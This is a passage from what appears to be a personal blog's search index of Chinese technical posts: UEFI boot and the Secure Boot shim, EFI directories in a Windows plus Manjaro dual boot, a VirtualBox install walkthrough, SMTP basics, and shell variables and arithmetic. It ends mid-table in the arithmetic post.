variable<code>db</code>, or the bootloader's SHA256 hash must be whitelisted inthe same NVRAM variable. A SHA256 hash will only match a specificversion of a particular bootloader, so updates won't be possible unlessthe firmware variable is also updated. So the certificates are the wayto go.</p><p>Unfortunately, many system vendors will only include a few SecureBoot certificates to their products: often only the vendor's owncertificate (for firmware updates and hardware debugging/OEMconfiguration tools) and Microsoft's Secure Boot certificates. Somesystems will allow editing the list of Secure Boot certificates throughfirmware settings (="BIOS settings"), but others won't. So anindependent solution was needed.</p><p>Microsoft offers an UEFI bootloader signing service for anyone, butat least initially the turnaround time for signing was quite long, sothe requirement to sign every version of GRUB directly would have causedunacceptable delays in bootloader updates. To solve the problem, theshim bootloader was developed: it's basically the simplest reasonableUEFI program that will add one or more certificates to the Secure Bootaccepted list. The simplicity will hopefully reduce the need to updatethe shim itself, so the open-source OS distributions (Linux and others)can just get their version of the shim signed by Microsoft just once andthen sign any version of GRUB with their own certificates, whose publicpart is embedded in the shim and allows Secure Boot accept thedistribution's version of GRUB.</p><p>Two similar terms are often used interchangeably, but in fact theyrefer to different things:</p><h2 id="boot-loaders-vs.-boot-managers">Boot Loaders vs. BootManagers</h2><ul><li><strong>Boot managers</strong> present a menu of boot options, orprovide some other way to control the boot process. The user can thenselect an option, and the boot manager passes control to the selectedtool.</li><li><strong>Boot loaders</strong> handle the task of loading an OSkernel into memory, often along with support files such as a Linuxinitial RAM disk (initrd) file, and starting the kernel running.</li></ul><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://unix.stackexchange.com/questions/565615/efi-boot-bootx64-efi-vs-efi-ubuntu-grubx64-efi-vs-boot-grub-x86-64-efi-grub-efi">EFI64.efivs EFI64.efi vs /boot/grub/x86_64-efi/grub.efi vs C:*</a></li><li><ahref="https://www.rodsbooks.com/efi-bootloaders/principles.html">ManagingEFI Boot Loaders for Linux:Basic Principles</a></li><li><ahref="https://en.wikipedia.org/wiki/EFI_system_partition&#39;">EFIsystem partition</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> os </tag>
            
            <tag> efi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过双系统看 EFI</title>
      <link href="/blog/2020/09/30/os/efi_2sys/"/>
      <url>/blog/2020/09/30/os/efi_2sys/</url>
      
        <content type="html"><![CDATA[<h2 id="安装系统对-uefi-影响">安装系统对 UEFI 影响</h2><p>Bootloader path for a permanently installed OS</p><p>When an operating system is installed permanently to a UEFI system,there is one new step that absolutely did not exist on classic BIOS.When installing the bootloader, four things are written to the NVRAMmemory that holds the firmware settings:</p><ul><li>Bootloader pathname on the EFI System Partition (ESP) that holds thebootloader(s)</li><li>the GUID of the ESP partition</li><li>a descriptive (human-friendly) name for this particular bootloaderinstance</li><li>optionally, some data for the bootloader</li></ul><p>For Windows, the standard UEFI pathname for the Windows boot processwill be <code>\EFI\Microsoft\Boot\bootmgfw.efi</code>, and thedescriptive name will be "Windows Boot Manager". The optional data seemsto contain a GUID reference to something within the Windows bootloader'sBCD configuration file.</p><p>For Ubuntu, the pathname should be<code>\EFI\Ubuntu\grubx64.efi</code> if you don't need Secure Bootsupport, or <code>\EFI\Ubuntu\shimx64.efi</code> if the Secure Boot shimis used. The descriptive name is simply "ubuntu" and the optional datais not used.</p><p>In Ubuntu, these UEFI NVRAM boot settings can be viewed using the<code>sudo efibootmgr -v</code> command; in Windows, you can start aCommand Prompt <em>as Administrator</em> and then use the<code>bcdedit /enum firmware</code> command to view the settings.</p><p>The UEFI specification has a standard convention that each vendorshould place the bootloader for a permanently installed OS within thepath <code>\EFI\&lt;vendor name&gt;</code> on the ESP, so havingmultiple UEFI bootloaders co-exist on the same ESP is actually supportedand should make things easier than with classic BIOS that had a singleMaster Boot Record per disk.</p><h2 id="启动过程">启动过程</h2><h3 id="uefi-启动流程">UEFI 启动流程</h3><ol type="1"><li><p>系统开机 - 上电自检（Power On Self Test 或 POST）。</p></li><li><p>UEFI 固件被加载，并由它初始化启动要用的硬件。</p></li><li><p>固件读取其引导管理器以确定从何处（比如，从哪个硬盘及分区）加载哪个UEFI 应用。</p><p>The EFI firmware has its own "boot menu", analogous to the menupresented by GRUB but at an earlier stage in the boot process. Just asGRUB lets you choose which Linux kernel to run, the EFI boot menu letsyou choose which EFI boot program to run — choices being things likeGRUB itself, or the Windows bootloader. (And, like GRUB's menu, the EFIboot menu is typically not shown by default; you have to press a hotkeyduring startup to see it.)</p><p>The firmewire check the configuration data that's stored in themotherboard's NVRAM (the "BIOS settings" memory) for the entries in theEFI boot menu which are what we see in UEFI boot manager.</p><p>These NVRAM boot entries are (typically) created by operating systeminstallers. When you install an OS and it places a bootloader file inthe EFI system partition, it also adds an entry to the NVRAMconfiguration so that the new bootloader will be available in the EFIboot menu. (In many cases, it also makes that new entry the default, sothat the OS you've just installed will boot on its own without youneeding to open the EFI boot menu and manually choose it.)</p><p>Each entry holds a human-readable name (to show in the menu) and apath to a boot program in an EFI system partition, as well as a prioritynumber that determines which entry is booted by default when you don'tpress the hotkey to see the menu.</p></li><li><p>固件按照引导管理器中的启动项目，加载 UEFI 应用。</p><ol type="1"><li><p>当选择从硬盘启动的时候，主板会去加载 <code>\EFI\Boot</code>文件夹下的 <code>bootx64.efi</code>。</p><p>这里可以做两个实验：</p><ol type="1"><li><p>设置 boot 默认从硬盘启动</p><p>将 <code>\EFI\Manjaro\grubx64.efi</code> 复制到<code>\EFI\Boot</code> 重命名为 <code>bootx64.efi</code>，开机进入的是grub</p></li><li><p>设置 boot 默认从硬盘启动</p><p><code>\EFI\Microsoft\Boot\bootmgfw.efi</code> 复制到<code>\EFI\Boot</code> 重命名为 <code>bootx64.efi</code>，开机进入的是windows</p></li></ol></li><li><p>当选择从 Windows 启动的时候，主板会去加载<code>\EFI\Microsoft\Boot</code> 文件夹下的<code>bootmgfw.efi</code>。</p><p>通过 <code>bootmgfw.efi</code> 文件来导入该目录下 BCD 文件，然后 BCD文件根据自身的配置内容加载系统引导文件 <code>winload.efi</code>(对比legacy bios 引导发现，UEFI 的引导文件 <code>winload.efi</code>,而 Legacy的引导文件为 <code>winload.exe</code>)</p></li><li><p>当选择从 Manjaro 启动的时候，主板会去加载<code>\EFI\Manjaro</code> 文件夹下的 <code>grubx64.efi</code>，然后进入grub。而 grub也是一个启动管理器，它会扫描并呈现本机的可用启动项供你选择。</p></li></ol></li><li><p>已启动的 UEFI 应用还可以启动其他应用（对应于 UEFI shell 或 rEFInd之类的引导管理器的情况）或者启动内核及 initramfs（对应于 GRUB之类引导器的情况），这取决于 UEFI 应用的配置。</p></li></ol><h3 id="系统引导流程">系统引导流程</h3><p>成功引导系统，需要具备以下条件：</p><ol type="1"><li>UEFI 固件正常</li><li>UEFI 启动项对应正确的 <code>*.efi</code> 文件</li><li>EFI 分区存在</li><li>引导器（<code>*.efi</code>）及其配置文件正常</li><li>操作系统相关文件正常</li></ol><p>满足这些条件后，系统启动的过程大致是：UEFI 根据 BootOrder 加载 EFI分区中的某个引导器(<code>grubx64.efi</code>)，引导器加载配置文件(<code>grub.cfg</code>)呈现启动菜单(GRUB菜单)，用户选择启动项后引导器加载操作系统内核。</p><p>装完双系统之后，在 UEFI 界面的 Boot Manager选项那里也会添加对应的启动项，如之前的图所示。</p><p>通过 easy uefi 查看这些启动项指向的文件（Harddisk项为空，因此没截图）：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929155837.png"alt="easy_uefi" /><figcaption aria-hidden="true">easy_uefi</figcaption></figure><h2 id="测试与现象">测试与现象</h2><p>下面首先看一下单/双系统的 EFI目录结果以及一些现象，后面在启动过程详细讲述如何启动。</p><h3 id="windows-单系统">Windows 单系统</h3><p>Windows 启动过程中有一行：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928213712.png"alt="startup" /><figcaption aria-hidden="true">startup</figcaption></figure><p>说明它是根据 <code>bootmgfw.efi</code> 引导的。</p><h4 id="efi-结构">EFI 结构</h4><p>Boot 是计算机默认引导文件所在的目录，Microsoft 是微软 Windows系统引导所在的目录。<code>bootmgfw.efi</code> 就是 windows默认的系统引导文件</p><p><code>\EFI\Boot</code> 文件夹： <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928211725.png"alt="Boot" /></p><p><code>\EFI\Microsoft\Boot</code> 文件夹： <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928211833.png"alt="Microsoft" /></p><p>对比 <code>\EFI\Boot</code> 文件夹下的 <code>bootx64.efi</code> 与<code>\EFI\Microsoft\Boot</code> 文件夹下的 <code>bootmgfw.efi</code> 的SHA1：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928212106.png"alt="sha1sum" /><figcaption aria-hidden="true">sha1sum</figcaption></figure><p>发现二者的 SHA1 值相同。</p><h3 id="双系统">双系统</h3><h4 id="uefi-的-boot-manager-界面">UEFI 的 Boot Manager 界面</h4><p>安装 Manjaro GNOME Linux 之后，查看 UEFI 的 Boot Manager 界面：</p><ol type="1"><li><p>Manjaro 启动使用的是<code>grubx64.efi</code> 引导</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929100448.png"alt="Manjaro" /><figcaption aria-hidden="true">Manjaro</figcaption></figure></li><li><p>Windows 启动使用 <code>bootmgfw.efi</code> 引导</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929100607.png"alt="Windows" /><figcaption aria-hidden="true">Windows</figcaption></figure></li><li><p>硬盘启动，发现使用 Manjaro 的 Grub 界面</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929101035.png"alt="harddisk" /><figcaption aria-hidden="true">harddisk</figcaption></figure><p>从硬盘启动，走的是<code>\EFI\Boot\bootx64.efi</code>，<code>\EFI\Boot\bootx64.efi</code>指向哪个系统就走哪个系统（win 或者Linux）。具体来说，就是你把哪个系统的引导（<code>bootmgfw.efi</code>或<code>grubx64.efi</code>）复制到这里，重命名为<code>bootx64.efi</code>，它就是对应系统的引导。</p></li></ol><p>通过 DiskGenius 查看三者的引导：</p><p>对比 <code>\EFI\Boot</code> 文件夹下的 <code>bootx64.efi</code> 、<code>\EFI\Microsoft\Boot</code> 文件夹下的<code>bootmgfw.efi</code>、<code>\EFI\Manjaro</code> 文件夹下的<code>grubx64.efi</code>的 SHA1：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929111326.png"alt="sha1" /><figcaption aria-hidden="true">sha1</figcaption></figure><p>发现 <code>bootx64.efi</code> 和 <code>grubx64.efi</code> 的 SHA1值相同。</p><blockquote><p>补充： 有时候会看到 shimx64.efi， 它是 shim 引导程序（shim用于安全启动 Secure Boot，调用 grub）。一般安装 Linux 的电脑会关闭Secure Boot，这样 grubx64.efi 和 shimx64.efi 就没什么区别了。</p></blockquote><h4 id="查看-efi-目录结构">查看 EFI 目录结构</h4><ol type="1"><li><p><code>\EFI\Booot</code></p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929163506.png"alt="boot" /><figcaption aria-hidden="true">boot</figcaption></figure></li><li><p><code>\EFI\Manjaro</code></p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929163543.png"alt="manjaro" /><figcaption aria-hidden="true">manjaro</figcaption></figure></li><li><p><code>\EFI\Microsoft\Boot</code></p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929163623.png"alt="Microsoft" /><figcaption aria-hidden="true">Microsoft</figcaption></figure></li></ol><p>操作系统安装器会创建 <code>\EFI&lt;distro&gt;</code>目录，把引导程序(<code>grubx64.efi</code>)放入其中，然后在 UEFI启动管理器中创建入口点（开机不停按 ESC 键进入 UEFI 管理面板）。</p><p>Windows 安装时会首先创建自己的目录<code>\EFI\Microsoft\Boot</code>，并在里面放置<code>bootmgfw.efi</code>， 然后再把 <code>bootmgfw.efi</code> 拷一份到<code>\EFI\Boot</code> 里并命名成<code>bootx64.efi</code>，这样系统缺省就从 windows 启动了。</p><p>安装 manjaro 的时候, manjaro 也会创建 <code>\EFI\Manjaro</code>目录，并放一个 <code>grubx64.efi</code>，然后再把<code>grubx64.efi</code> 拷一份到 <code>\EFI\Boot</code> 里并命名成<code>bootx64.efi</code>，因此我们先安装 Windows 再安装Manjaro，开机启动看到的直接就是 grub 界面。</p><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://wiki.archlinux.org/index.php/EFI_system_partition">EFIsystem partition</a></li><li><a href="https://www.jianshu.com/p/7821027cc455">Linux UEFI与备份还原(引导修复)</a></li><li><a href="https://www.cnblogs.com/feipeng8848/p/10723661.html">EFI系统引导的一些零碎知识点</a></li><li><ahref="https://blog.csdn.net/li_qing_xue/article/details/79228867#commentBox">Win10+Ubuntu双系统：UEFI+GPT 和 Legacy+MBR 引导模式</a></li><li><ahref="https://unix.stackexchange.com/questions/160500/how-do-multiple-boot-loaders-work-on-an-efi-system-partition">Howdo multiple boot loaders work on an EFI system partition</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> os </tag>
            
            <tag> efi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UEFI+GPT win+manjaro 双系统安装</title>
      <link href="/blog/2020/09/29/linux/manjaro/manjaro_install/"/>
      <url>/blog/2020/09/29/linux/manjaro/manjaro_install/</url>
      
        <content type="html"><![CDATA[<p>首先安装好 Windows 系统，这儿就不说了。</p><h2 id="最初看的安装教程">最初看的安装教程</h2><p><a href="https://www.bilibili.com/s/video/BV1eJ411P7NF">UEFI 安装Win10+Manjaro-Linux 双系统</a></p><h2 id="windows">Windows</h2><p>遇到的问题：</p><ol type="1"><li><p>Windows 原版镜像安装时报错 Virtualbox 使用百度网盘离线下载的 MSDNItellyou 的镜像总是报错，本来以为是没下完整，后来又下载了一次无效。</p><p>使用<ahref="https://www.52pojie.cn/thread-733425-1-1.html">俄罗斯狂人精简的win10 专业版系统</a></p></li><li><p>Virtualbox 默认不支持 USB 3.0 安装扩展</p><p>先命令行安装对应版本，然后在 File-&gt;Preference-&gt;Extension中加载下载的文件 路径我当时是使用 find 命令找的，大致在<code>/usr/share/virtualbox/extensions</code></p><p>https://wiki.manjaro.org/index.php?title=VirtualBox</p></li><li><p>Virtualbox 默认使用 legacy bios,需要更改为 EFI</p><p><code>Mechine-&gt;Settings-&gt;System</code> 面板的<code>Enable EFI(spectial OSes only)</code></p><blockquote><p>注：该项周围的三个都可以勾选上</p></blockquote></li><li><p>Vbox 共享文件夹设置</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929105210.png"alt="shared_folder" /><figcaption aria-hidden="true">shared_folder</figcaption></figure><p>注意：勾选 Auto-mount 自动挂载（否则你还要去手动挂载），MaekPermanent 永久共享（否则重启之后又没了，还需要再次设置）</p></li></ol><h2 id="manjaro-gnome">Manjaro Gnome</h2><p>首先，下载好 iso 镜像文件，然后在 win10 虚拟机，右键<code>Settings-&gt;Storage</code>, 增加 manjaro linux 的ISO,然后选择将其作为 Live CD/DVD 加载：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928213923.png"alt="configuration" /><figcaption aria-hidden="true">configuration</figcaption></figure><p>启动 win10,然后不停地按 <code>Esc</code> 进入 UEFI,选择<code>Boot Manager</code>，回车</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928214421.png"alt="Boot Manager" /><figcaption aria-hidden="true">Boot Manager</figcaption></figure><p>然后选择第二个 CD/ROM， 也就是我们的 Manjaro GNOME CD/DVD:</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928214534.png"alt="20200928214534" /><figcaption aria-hidden="true">20200928214534</figcaption></figure><p>驱动改成闭源驱动: no-free ，然后回车，等待启动</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928214614.png"alt="manajro_start" /><figcaption aria-hidden="true">manajro_start</figcaption></figure><p>启动之后，点击 Install launcher，然后安装：</p><p>其中，以下界面，可以验证我们是 EFI+GPT, 并且我们选择<code>Manual partitioning</code>：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200928214822.png"alt="20200928214822" /><figcaption aria-hidden="true">20200928214822</figcaption></figure><h3 id="分区">分区</h3><p>我是直接将 manjaro 挂载在 windows 的 100m 的 EFI 分区上的</p><ol type="1"><li><p>分区</p><ol type="1"><li><p>EFI 分区</p><p>直接打开 Windows 的 100M EFI 分区，文件系统fat32，内容：<strong>keep（保留）</strong>，挂载点<code>/boot/efi</code>。</p></li><li><p>根目录</p><p>挂载点：<code>/</code>，文件系统 <code>ext4</code></p><p>存储系统根用户的配置信息与软件，由于 Manjaro 的软件市场默认是安装在非home 下，因此建议留足够的大小</p><ol type="1"><li><p><code>/var</code> 目录</p><p>存储变量数据例如 spool目录和文件，管理和登录数据,它通常被用作缓存或者日志记录，因此读写频繁。将它独立出来可以避免由于大量日志写入造成的磁盘空间耗尽等问题。</p></li><li><p><code>/home</code></p><p>将 <code>/home</code> 目录独立使得 <code>/</code>分区可以单独重新划分，但是请注意你可以在 <code>/home</code>没有独立分区的情况下你仍然可以在不修改 <code>/home</code>目录内容的情况下重装 Manjaro Linux.</p></li></ol></li><li><p><code>swap</code>,文件系统 <code>linuxswap</code></p><p>一般和你物理内存大小相当。</p></li></ol><p>关于分区略详细的介绍，可以看<ahref="https://www.jianshu.com/p/f9413171cb11">7.Manjaro文件结构和分区方案</a></p></li><li><p>重装的时候，删除 efi 引导以及格式化磁盘</p><p><a href="https://blog.csdn.net/mtllyb/article/details/78635757">删除efi 引导</a></p></li></ol><p>当然，建议你也直接重新分一个 512 M 的区域用来存放 Linux的引导，这样重装也方便</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMTP 协议</title>
      <link href="/blog/2020/09/14/network/smtp/"/>
      <url>/blog/2020/09/14/network/smtp/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>本文将详细讲述 SMTP 的基础知识，并向你展示 SMTP 客户端与 SMTP服务端之间的通信过程，最后，通过使用终端当作 SMTP客户端，通过命令行的方式直接向 QQ 邮箱发送一封邮件。</p><p>如果你配置过邮件客户端的话，你应该了解 IMAP, POP 和 SMTP。 IMAP 和POP 是用来从邮箱取回邮件的，而 SMTP 是用来发送邮件的。关于 IMAP 和 POP协议，未来我会在另一篇文章中讲述。</p><p>SMTP（Simple Mail TransferProtocol）是一个用来在互联网上高效可靠传输邮件的标准协议。它是一个面向连接的，基于文本的协议。它是基于TCP/IP 协议的应用层协议，通常运行在 25 端口。理论上来讲，SMTP 可以被TCP, UDP，甚至一些三方协议处理。RFC 定义如下：</p><blockquote><p>SMTP is independent of the particular transmission subsystem andrequires only a reliable ordered data stream channel.</p></blockquote><p>此外，互联网编号分配机构（IANA，Internet Assigned NumbersAuthority）将 TCP 和 UDP 的 25 端口都分配给了 SMTP,以便使用。然而，在实际中，大多数组织和应用仅选择实现 TCP 协议。</p><p>它采用 “存储转发”的方式来协调不同网络之间的邮件发送过程。在 SMTP协议中，有一种更小的软件服务，叫做 Mail Transfer Agents (MTA,邮件传输代理)。它帮助管理邮件的传输和最后向接收方邮箱的递送环节。SMTP不仅定义了整个通信流，它还可以支持发送方站点、接收方站点或任何中继服务器上电子邮件的延迟发送。</p><p>SMTP 定义了一种通信协议，其规定了一封邮件如何从你的电脑的 MTA到达目的 SMTP 服务器的 MTA（其中可能跨越多个网络）。</p><h2 id="terminology">Terminology</h2><blockquote><p><strong>User Agent (UA)</strong>:用来发送和接收电子邮件的应用(Outlook, Mozilla Thunderbird, QQ邮箱，Gmail etc.)</p><p><strong>Mail Transfer Agent / Message Transfer Agent (MTA)</strong>:一个运行在 SMT P服务器上的的进程，它将电子邮件转发给正确的收件人，并管理发送到用户邮箱的电子邮件。通常情况下， MTAs维护一个一个邮件队列，以便当远程服务器不可用时，可以安排重复交付尝试。MTA通常包含一个专门的软件称为<strong>mail delivery agent</strong> 或<strong>message delivery agent(MDA)</strong>。它负责将电子邮件传递到本地收件人的邮箱，而 MTA 更关注于SMTP 服务器之间的邮件转发。</p></blockquote><h2 id="principle">Principle</h2><p>当一个用户通过用户代理（例如：Thunderbird）发送邮件时， 客户端 SMTP进程打开一个与在服务器（例如: smtp.gmail.com）的端口 25 上运行的 SMTP进程的 TCP 连接。在最初的握手之后，客户端和服务器 SMTP进程进行简短的请求-响应对话，以便发送电子邮件</p><h2 id="反对">反对</h2><p>SMTP 是构建在端到端报文的传递之上。</p><ol type="1"><li>首先，SMTP 客户端通过目标主机的 SMTP 服务端的 25端口与其联系。系统等待 <code>220 READY FOR MAIL</code> 消息报文</li><li>一旦收到 200 报文，客户端发送 <code>HELO</code> 命令</li><li>服务端返回报文：<code>250 Requested Mail Action OK</code></li><li></li></ol><h2 id="references">References</h2><blockquote><ol type="1"><li><ahref="https://medium.com/team-rover/simple-mail-transfer-protocol-f55df5e2aebd">SIMPLEMAIL TRANSFER PROTOCOL</a></li><li><ahref="https://medium.com/@aryamansharda/how-email-actually-gets-sent-e1b2402b3a26">HowEmail Actually Gets Sent: A Look At SMTP</a></li><li><ahref="https://stackoverflow.com/questions/16809214/is-smtp-based-on-tcp-or-udp">IsSMTP based on TCP or UDP?</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> smtp </tag>
            
            <tag> mail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell 变量</title>
      <link href="/blog/2020/09/02/programming/shell/4.varibles/"/>
      <url>/blog/2020/09/02/programming/shell/4.varibles/</url>
      
        <content type="html"><![CDATA[<p>shell 编程设计到的变量主要为两种类型：环境变量、位置变量、用户定义变量、预定义变量。</p><ol type="1"><li><p>环境变量：变量中保存的是和系统操作环境相关的数据。（值无法更改，可以新建）</p><p>环境变量会在当前 shell 和这个 shell 的所有子 shell当中生效，如果把环境变量写入相应的配置文件，那么这个环境变量就会在所有的shell 中生效。</p></li><li><p>位置参数变量：用来向脚本当中传递参数或数据，变量名不能自定义，变量作用是固定的。（名称不能自定义，不能新建，只能改值）</p></li><li><p>用户自定义变量（也叫本地变量）：只在当前的 shell中生效。</p></li><li><p>预定义变量：Bash中已经定义好的变量，变量名不能自定义，变量作用也是固定的。（名称不能自定义，不能新建，只能改值）</p></li></ol><h2 id="环境变量">环境变量</h2><p>shell维护着一组环境变量，用来记录特定的系统信息。比如系统的名称、登录到系统上的用户名、用户的系统 ID（也称为 UID）、用户的默认主目录以及 shell查找程序的搜索路径。可以用 set命令来显示一份完整的当前环境变量列表。</p><p>常见的比如：<code>SHELL，UID，USER,USERNAME，QT_IM_MODULE，0，BROWSER，EDITOR</code></p><ol type="1"><li><p>在脚本中，你可以在环境变量名称之前加上美元符（<code>$</code>）来使用这些环境变量，如：</p><p><code>echo "User info for userid: $USER"</code></p></li><li><p>执行 Shell 脚本时，可以向脚本传递参数</p><p>脚本内获取参数的格式为：<code>$n</code>。n 代表一个数字，1为执行脚本的第一个参数。</p></li><li><p>正因为第一条，出现了两个问题。</p><ol type="1"><li><p>只要脚本在引号中出现美元符，它就会以为你在引用一个变量。</p><p>如果你只想想打印 <code>$30</code> 的纯文本，那你需要使用反引号<code>\</code> 对 <code>$</code> 进行转移</p></li><li><p>直接 <code>$</code> 引用变量名，出现歧义时，采用<code>$&#123;&#125;</code></p><p>因当 <code>echo $12</code> 时， shell会首先将引号中的变量当作环境变量或者传递的参数解释，因此如果你想要引用<code>$12</code> 变量，而不是 <code>$1</code>2， 那建议这样写<code>$&#123;12&#125;</code>.</p></li></ol></li></ol><h2 id="位置变量">位置变量</h2><p>位置参数变量</p><ol type="1"><li><p><code>$n</code> ：n 为数字，<code>$0</code>代表命令本身，<code>$1-$9</code>代表第一个到第九个参数，十以上的参数需要用大括号包含，如<code>$&#123;10&#125; 、$&#123;11&#125;</code></p></li><li><p><code>$*</code> ：这个变量代表命令行中所有的参数，<code>$*</code>把所有的参数看成一个整体（如果循环 <code>$*</code>输出参数，将只输出一次）</p></li><li><p><code>$@</code> ：这个变量也代表命令行中所有的参数，不过<code>$@</code> 把每个参数区分对待（如果循环 <code>$@</code>输出参数，将单独输出每个参数）</p></li><li><p><code>$#</code> ：这个变量代表命令行中所有参数的个数</p></li></ol><h2 id="预定义变量">预定义变量</h2><ol type="1"><li><p><code>$?</code> 退出码</p><p>shell 中运行的每个命令都使用退出状态码（exit status）告诉 shell它已经运行完毕。 Linux 提供了一个专门的变量 <code>$?</code>来保存上个已执行命令的退出状态码</p><p>Linux 错误退出状态码没有什么标准可循，但有一些可用的参考：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200902170104.png"alt="exit code" /><figcaption aria-hidden="true">exit code</figcaption></figure><p>默认情况下，shell 脚本会以脚本中的最后一个命令的退出状态码退出。exit命令允许你在脚本结束时指定一个退出状态码，例如：<code>exit 5</code>。（注意：退出状态码最大只能是255）</p></li><li><p><code>$$</code> ：当前进程的进程号（PID）</p></li><li><p><code>$!</code> ：后台运行的最后一个进程的进程号（PID）</p></li></ol><h2 id="用户变量">用户变量</h2><p>用户变量可以是任何由字母、数字或下划线组成的文本字符串，长度不超过 20个。<strong>用户变量区分大小写</strong>使用等号将值赋给用户变量。在变量、等号和值之间<strong>不能出现空格</strong>（对，不能出现空格）。</p><p>shell 脚本会自动决定变量值的数据类型。在脚本的整个生命周期里，shell脚本中定义的变量会一直保持着它们的值，但在 shell脚本结束时会被删除掉。</p><p>引用一个变量值时需要使用美元符，而引用变量来<strong>对其进行赋值时则不要使用美元符</strong>。</p><p>即：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> test.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">var1=1</span><br><span class="line">echo &quot;var1 = $var1&quot;</span><br><span class="line">var2=$var1</span><br><span class="line">echo &quot;var2 = $var2&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test.sh</span></span><br><span class="line">var1 = 1</span><br><span class="line">var2 = 1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">your_name=<span class="string">&quot;qinjx&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$your_name</span></span></span><br><span class="line">qinjx</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><a href="https://www.cnblogs.com/farwish/p/3923622.html">Bash变量：自定义变量 &amp; 环境变量 &amp; 位置参数变量 &amp;预定义变量</a></li><li>Linux 命令行与 Shell 脚本编程大全</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell 数学运算</title>
      <link href="/blog/2020/09/02/programming/shell/5.arithmetic_opt/"/>
      <url>/blog/2020/09/02/programming/shell/5.arithmetic_opt/</url>
      
        <content type="html"><![CDATA[<h2 id="数学运算">数学运算</h2><p>对 shell 脚本来说，处理运算的过程比较麻烦，而且 shell对整数和浮点数的处理方式也不同，因此下面将整数和浮点操作分开讲述。</p><p>Bash 支持一系列的算数运算，列表如下，它们可以工作在 let, declare,算术扩展（arithmetic expansion）这三种方式之下。</p><table><colgroup><col style="width: 39%" /><col style="width: 41%" /><col style="width: 9%" /><col style="width: 9%" /></colgroup><thead><tr class="header"><th>Arithmetic Operator</th><th>Description</th><th></th><th></th></tr></thead><tbody><tr class="odd"><td>id++, id--</td><td>variable post-increment, post-decrement</td><td></td><td></td></tr><tr class="even"><td>++id, --id</td><td>variable pre-increment, pre-decrement</td><td></td><td></td></tr><tr class="odd"><td>-, +</td><td>unary minus, plus</td><td></td><td></td></tr><tr class="even"><td>!, ~</td><td>logical and bitwise negation</td><td></td><td></td></tr><tr class="odd"><td>**</td><td>exponentiation</td><td></td><td></td></tr><tr class="even"><td>*, /, %</td><td>multiplication, division, remainder (modulo)</td><td></td><td></td></tr><tr class="odd"><td>+, -</td><td>addition, subtraction</td><td></td><td></td></tr><tr class="even"><td>&lt;&lt;, &gt;&gt;</td><td>left and right bitwise shifts</td><td></td><td></td></tr><tr class="odd"><td>&lt;=, &gt;=, &lt;, &gt;</td><td>comparison</td><td></td><td></td></tr><tr class="even"><td>==, !=</td><td>equality, inequality</td><td></td><td></td></tr><tr class="odd"><td>&amp;</td><td>bitwise AND</td><td></td><td></td></tr><tr class="even"><td>^</td><td>bitwise XOR</td><td></td><td></td></tr><tr class="odd"><td></td><td></td><td>bitwise OR</td><td></td></tr><tr class="even"><td>&amp;&amp;</td><td>logical AND</td><td></td><td></td></tr><tr class="odd"><td></td><td></td><td></td><td>logical OR</td></tr><tr class="even"><td>expression ? expression : 